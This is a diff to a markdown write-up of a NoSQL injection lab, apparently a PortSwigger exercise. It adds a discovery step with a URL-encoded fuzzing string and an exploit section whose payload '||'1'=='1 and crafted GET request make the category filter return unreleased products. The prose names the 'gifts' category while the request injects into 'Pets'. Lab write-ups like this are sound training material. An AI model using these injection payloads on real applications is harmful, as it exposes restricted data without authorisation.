@@ -8,7 +8,7 @@ The product category filter for this lab is powered by a MongoDB NoSQL database.
 
 To solve the lab, perform a NoSQL injection attack that causes the application to display unreleased products.
 
-## Exploit
+## Discovery
 
 Product category request
 ```http
@@ -31,9 +31,26 @@ Accept-Encoding: gzip, deflate, br
 Priority: u=0, i
 ```
 
+This returns 3 items:
+![](../../../../public/images/PS_NoSQL_Lab_20250607%20_173803.png)
 Testing for NoSQL injection
 ```http
 GET /filter?category=%27%22%60%7b%20%3b%24%46%6f%6f%7d%20%24%46%6f%6f%20%5c%78%59%5a HTTP/2
 ```
 
+Server responds with an "Internal Server Error" showing that MongoDB is being used.
 ![](../../../../public/images/PS_NoSQL_lab_20250607%20_171300.png)
+
+## Exploit
+Payload
+```
+'||'1'=='1
+```
+
+Request
+```http
+GET /filter?category=Pets%27||%271%27==%271 HTTP/2
+```
+
+The `category=gifts` filter now returns all items after a NoSQL injection bypasses the query restriction.
+![](../../../../public/images/PS_NoSQL_Lab_20250607%20_174006.png)
